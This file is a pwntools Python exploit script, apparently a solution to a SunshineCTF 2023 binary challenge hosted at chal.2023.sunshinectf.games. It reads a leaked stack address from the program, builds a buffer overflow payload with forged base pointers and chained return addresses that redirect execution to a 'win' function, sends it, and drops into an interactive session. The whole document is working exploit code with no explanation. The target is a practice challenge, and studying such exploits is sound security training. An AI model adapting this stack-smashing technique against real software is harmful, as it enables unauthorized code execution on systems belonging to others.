#!/usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
        #terminal=["st"]
)

def start(binary):

    gs = '''
        b *0x40125b

        init-pwndbg

        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("chal.2023.sunshinectf.games", 23002)
    else:
        return process(binary)

def exploit(p,e,r):
    #pad = b"A" * 208

    p.recvuntil(b"<<< Song Begins At ")
    
    stack_leak = int(p.recvline(),16)

    base_pointer = stack_leak + 0x98

    log.info(f"Stack leak {hex(stack_leak)}")

    canary1 = p64(0x401276)
    canary2 = p64(0x4012a0)
    canary3 = p64(0x4012ca)
    canary4 = p64(0x4012f0)
    win = p64(e.sym["win"])

    

    #pad = cyclic(128)
    pad = b"A" * 128
    chain = p64(base_pointer) +  canary1 + b"A" * 8 + p64(base_pointer+0x28) 
    chain += canary2  + b"A" * 8 + p64(base_pointer + 0x38) 
    #chain += b"A" * 8 +  p64(base_pointer + 0x48) + canary3 
    chain += b"A" * 8 +  p64(base_pointer + 0x50) + canary3 
    chain += b"A" * 32 + canary4 + b"A" * 8 + win
    #chain += p64(base_pointer + 0x10) + canary3
    #chain += canary4
    #h+  + canary3 + canary4 + p64(e.sym["win"])


    p.sendline(pad + chain)
    p.interactive()


if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
